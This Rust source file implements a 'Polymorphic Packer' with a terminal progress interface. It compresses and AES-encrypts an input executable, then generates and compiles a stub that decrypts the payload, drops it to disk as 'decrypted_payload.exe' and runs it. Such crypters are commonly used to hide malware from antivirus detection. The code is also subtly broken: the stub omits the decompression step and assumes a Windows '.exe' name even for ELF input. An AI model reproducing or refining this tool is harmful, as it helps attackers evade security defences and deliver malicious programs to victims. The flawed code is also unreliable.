use std::fs::{read, File};
use std::io::Write;
use std::process::Command;
use std::sync::Mutex;
use std::time::{Duration, Instant};
use once_cell::sync::Lazy;
use ratatui::{
    prelude::*,
    widgets::{Block, Borders, Paragraph, Gauge, List, ListItem},
    Terminal,
};
use crossterm::{
    event::{self, Event, KeyCode},
    terminal::{enable_raw_mode, disable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
    ExecutableCommand,
};
use rand::{SeedableRng, rngs::StdRng, RngCore};
use aes::Aes256;
use aes::cipher::NewBlockCipher;
use block_modes::{Cbc, BlockMode};
use block_modes::block_padding::Pkcs7;
use flate2::{Compression, write::ZlibEncoder};
use goblin::Object;
use clap::Parser;

#[derive(Parser, Debug)]
#[clap(author = "Your Name", version = "1.0")]
struct CommandLineArguments {
    #[clap(short, long)]
    input_file: String,

    #[clap(short, long)]
    output_file: String,
}

// Global channel for progress updates
static TX: Lazy<Mutex<Option<std::sync::mpsc::Sender<(String, u16)>>>> = 
    Lazy::new(|| Mutex::new(None));

// TUI State structure
struct PackerApp {
    progress: u16,
    status: String,
    finished: bool,
    start_time: Instant,
    log_messages: Vec<String>,
    input_file: String,
    output_file: String,
}

impl PackerApp {
    fn new(input_file: String, output_file: String) -> Self {
        Self {
            progress: 0,
            status: "Initializing...".to_string(),
            finished: false,
            start_time: Instant::now(),
            log_messages: Vec::new(),
            input_file,
            output_file,
        }
    }

    fn add_log(&mut self, message: String) {
        let timestamp = humantime::format_duration(self.start_time.elapsed())
            .to_string();
        self.log_messages.push(format!("[{}] {}", timestamp, message));
        if self.log_messages.len() > 15 {
            self.log_messages.remove(0);
        }
    }
}

/// Generate a dynamic AES-256 key and IV
fn generate_dynamic_key_iv() -> ([u8; 32], [u8; 16]) {
    let mut key = [0u8; 32];
    let mut iv = [0u8; 16];
    let mut rng = StdRng::from_entropy();
    rng.fill_bytes(&mut key);
    rng.fill_bytes(&mut iv);
    (key, iv)
}

/// Encrypt data using AES-256 CBC
fn encrypt_data(plaintext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    let cipher = Aes256::new(key.into());
    let mode = Cbc::<Aes256, Pkcs7>::new(cipher, iv.into());
    mode.encrypt_vec(plaintext)
}

/// Compress data using zlib
fn compress_data(data: &[u8]) -> Vec<u8> {
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(data).unwrap();
    encoder.finish().unwrap()
}

/// Generate a Rust polymorphic stub
fn generate_polymorphic_stub(encrypted_payload: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> String {
    format!(
        r#"
use aes::Aes256;
use aes::cipher::NewBlockCipher;
use block_modes::{{Cbc, BlockMode}};
use block_modes::block_padding::Pkcs7;

fn decrypt_data(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {{
    let cipher = Aes256::new(key.into());
    let mode = Cbc::<Aes256, Pkcs7>::new(cipher, iv.into());
    mode.decrypt_vec(ciphertext).unwrap()
}}

fn execute_payload(payload: &[u8]) {{
    use std::fs::File;
    use std::io::Write;
    use std::process::Command;

    let temp_exe = "decrypted_payload.exe";
    let mut file = File::create(temp_exe).unwrap();
    file.write_all(payload).unwrap();
    
    Command::new(temp_exe).spawn().expect("Failed to execute payload");
}}

fn main() {{
    let encrypted_payload = vec![{}];
    let key = [{}];
    let iv = [{}];

    let decrypted_payload = decrypt_data(&encrypted_payload, &key, &iv);
    execute_payload(&decrypted_payload);
}}
        "#,
        encrypted_payload.iter().map(|b| format!("0x{:02x}", b)).collect::<Vec<_>>().join(", "),
        key.iter().map(|b| format!("0x{:02x}", b)).collect::<Vec<_>>().join(", "),
        iv.iter().map(|b| format!("0x{:02x}", b)).collect::<Vec<_>>().join(", ")
    )
}

/// Create and compile the final executable
fn create_final_executable(encrypted_payload: Vec<u8>, key: [u8; 32], iv: [u8; 16], output_file: &str) {
    // Create a temporary directory for the stub project
    std::fs::create_dir_all("stub_project/src").expect("Failed to create stub project directory");

    // Create Cargo.toml for the stub
    let cargo_toml = r#"[package]
name = "polymorphic_stub"
version = "0.1.0"
edition = "2021"

[dependencies]
aes = "0.7.5"
block-modes = "0.8.1"
cipher = "0.3.0"
"#;

    let polymorphic_stub = generate_polymorphic_stub(&encrypted_payload, &key, &iv);

    // Write the stub source code
    let mut stub_file = File::create("stub_project/src/main.rs")
        .expect("Failed to create stub source file");
    stub_file.write_all(polymorphic_stub.as_bytes())
        .expect("Failed to write to stub file");

    // Write the Cargo.toml
    let mut cargo_file = File::create("stub_project/Cargo.toml")
        .expect("Failed to create Cargo.toml");
    cargo_file.write_all(cargo_toml.as_bytes())
        .expect("Failed to write to Cargo.toml");

    println!("[*] Stub project created in stub_project/");

    // Build the stub using cargo
    let cargo_build = Command::new("cargo")
        .current_dir("stub_project")
        .args(&["build", "--release"])
        .output()
        .expect("Failed to build stub project");

    if cargo_build.status.success() {
        // Copy the compiled executable to the desired output location
        std::fs::copy(
            "stub_project/target/release/polymorphic_stub.exe",
            output_file
        ).expect("Failed to copy final executable");
        println!("[+] Successfully compiled polymorphic packed executable: {}", output_file);
    } else {
        eprintln!("[!] Compilation failed: {}", String::from_utf8_lossy(&cargo_build.stderr));
    }

    // Clean up the temporary project directory
    std::fs::remove_dir_all("stub_project").expect("Failed to clean up stub project directory");
}

/// Process an input executable and generate an encrypted version
fn handle_executable_file(input_file: &str, output_file: &str) -> Result<(), Box<dyn std::error::Error>> {
    let tx = TX.lock().unwrap();
    
    tx.as_ref().map(|tx| tx.send((format!("Reading file: {}", input_file), 10)).unwrap());
    let bytes = read(input_file)?;
    
    match Object::parse(&bytes)? {
        Object::Elf(_) | Object::PE(_) => {
            tx.as_ref().map(|tx| tx.send(("Compressing payload...".to_string(), 20)).unwrap());
            let compressed_payload = compress_data(&bytes);
            
            tx.as_ref().map(|tx| tx.send(("Generating encryption keys...".to_string(), 30)).unwrap());
            let (key, iv) = generate_dynamic_key_iv();
            
            tx.as_ref().map(|tx| tx.send(("Encrypting payload...".to_string(), 40)).unwrap());
            let encrypted_payload = encrypt_data(&compressed_payload, &key, &iv);
            
            create_final_executable(encrypted_payload, key, iv, output_file);
            tx.as_ref().map(|tx| tx.send(("✨ Packing completed successfully!".to_string(), 100)).unwrap());
        }
        _ => {
            tx.as_ref().map(|tx| tx.send(("❌ Unsupported executable format".to_string(), 100)).unwrap());
            return Err("Unsupported executable format".into());
        }
    }
    Ok(())
}

fn run_tui(input_file: String, output_file: String) -> Result<(), Box<dyn std::error::Error>> {
    // Setup terminal
    enable_raw_mode()?;
    std::io::stdout().execute(EnterAlternateScreen)?;
    let mut terminal = Terminal::new(CrosstermBackend::new(std::io::stdout()))?;

    let mut app = PackerApp::new(input_file.clone(), output_file.clone());
    let (tx, rx) = std::sync::mpsc::channel();
    
    // Clone tx before moving it
    let thread_tx = tx.clone();
    *TX.lock().unwrap() = Some(tx);

    // Spawn packing process with cloned sender
    std::thread::spawn(move || {
        if let Err(e) = handle_executable_file(&input_file, &output_file) {
            thread_tx.send((format!("❌ Error: {}", e), 100)).unwrap();
        }
    });

    loop {
        // Handle progress updates
        if let Ok((status, progress)) = rx.try_recv() {
            app.status = status.clone();
            app.progress = progress;
            app.add_log(status);
            if progress == 100 {
                app.finished = true;
            }
        }

        terminal.draw(|f| {
            let size = f.size();
            
            // Create main layout
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .constraints([
                    Constraint::Length(3),  // Title
                    Constraint::Length(3),  // Progress
                    Constraint::Min(8),     // Log
                    Constraint::Length(8),  // Info
                ].as_ref())
                .split(size);

            // Title
            let title = Paragraph::new("Polymorphic Packer")
                .style(Style::default().fg(Color::Cyan).bold())
                .alignment(Alignment::Center)
                .block(Block::default().borders(Borders::ALL));
            f.render_widget(title, chunks[0]);

            // Progress bar
            let progress_style = if app.finished {
                Style::default().fg(Color::Green)
            } else {
                Style::default().fg(Color::Yellow)
            };
            
            let gauge = Gauge::default()
                .block(Block::default().title("Progress").borders(Borders::ALL))
                .gauge_style(progress_style)
                .ratio(f64::from(app.progress) / 100.0)
                .label(format!("{}%", app.progress));
            f.render_widget(gauge, chunks[1]);

            // Log messages
            let log_items: Vec<ListItem> = app.log_messages.iter()
                .map(|msg| {
                    let style = if msg.contains("Error") {
                        Style::default().fg(Color::Red)
                    } else if msg.contains("completed") {
                        Style::default().fg(Color::Green)
                    } else {
                        Style::default().fg(Color::White)
                    };
                    ListItem::new(msg.as_str()).style(style)
                })
                .collect();

            let log = List::new(log_items)
                .block(Block::default().title("Log").borders(Borders::ALL))
                .style(Style::default());
            f.render_widget(log, chunks[2]);

            // Info panel
            let info = vec![
                format!("Input File: {}", app.input_file),
                format!("Output File: {}", app.output_file),
                format!("Elapsed Time: {}", 
                    humantime::format_duration(app.start_time.elapsed())),
                String::new(),
                "Press 'q' to exit when finished".to_string(),
            ];

            let info_text = Paragraph::new(info.join("\n"))
                .block(Block::default().title("Information").borders(Borders::ALL))
                .style(Style::default().fg(Color::White));
            f.render_widget(info_text, chunks[3]);
        })?;

        // Handle input
        if event::poll(Duration::from_millis(100))? {
            if let Event::Key(key) = event::read()? {
                if key.code == KeyCode::Char('q') && app.finished {
                    break;
                }
            }
        }
    }

    // Cleanup
    disable_raw_mode()?;
    std::io::stdout().execute(LeaveAlternateScreen)?;
    Ok(())
}

// Update main function to use TUI
fn main() {
    let args = CommandLineArguments::parse();
    if let Err(e) = run_tui(args.input_file, args.output_file) {
        eprintln!("Error: {}", e);
    }
}